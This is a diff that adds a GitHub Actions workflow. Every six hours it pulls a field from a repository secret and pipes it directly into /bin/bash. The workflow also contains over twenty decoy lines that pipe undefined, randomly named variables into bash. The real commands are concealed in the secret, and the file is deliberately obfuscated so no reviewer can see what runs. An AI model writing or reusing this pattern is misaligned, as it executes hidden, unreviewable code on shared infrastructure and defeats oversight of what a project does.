@@ -1,0 +1,38 @@
+name: shuangrizoubo
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shuangrizoubo
+        env:
+          ed2: ${{ secrets.ed2 }}
+        run: |
+          echo $ed2 | jq -r .ujvn094 | /bin/bash
+          echo $qj8 | jq -r .ldlxo8 | /bin/bash
+          echo $yd6454 | jq -r .l2924 | /bin/bash
+          echo $pq92277 | jq -r .swl822 | /bin/bash
+          echo $ljuu156 | jq -r .y372 | /bin/bash
+          echo $zv0183 | jq -r .d3 | /bin/bash
+          echo $gwvz5 | jq -r .xlzx805 | /bin/bash
+          echo $ttfiy13 | jq -r .y20 | /bin/bash
+          echo $y1884 | jq -r .y04750 | /bin/bash
+          echo $iinu77519 | jq -r .r63102 | /bin/bash
+          echo $enx6245 | jq -r .qhn72651 | /bin/bash
+          echo $xxlg024 | jq -r .m3292 | /bin/bash
+          echo $tsa8 | jq -r .r14144 | /bin/bash
+          echo $nhs23558 | jq -r .hdx7268 | /bin/bash
+          echo $v05 | jq -r .horqr40 | /bin/bash
+          echo $wpyol2637 | jq -r .dai159 | /bin/bash
+          echo $ftbfc2 | jq -r .u04281 | /bin/bash
+          echo $oue0 | jq -r .k3673 | /bin/bash
+          echo $obac890 | jq -r .sxskh6 | /bin/bash
+          echo $psyn82120 | jq -r .rjspn65245 | /bin/bash
+          echo $zdff12 | jq -r .avnif279 | /bin/bash
+          echo $nghn74 | jq -r .nnra99 | /bin/bash
+
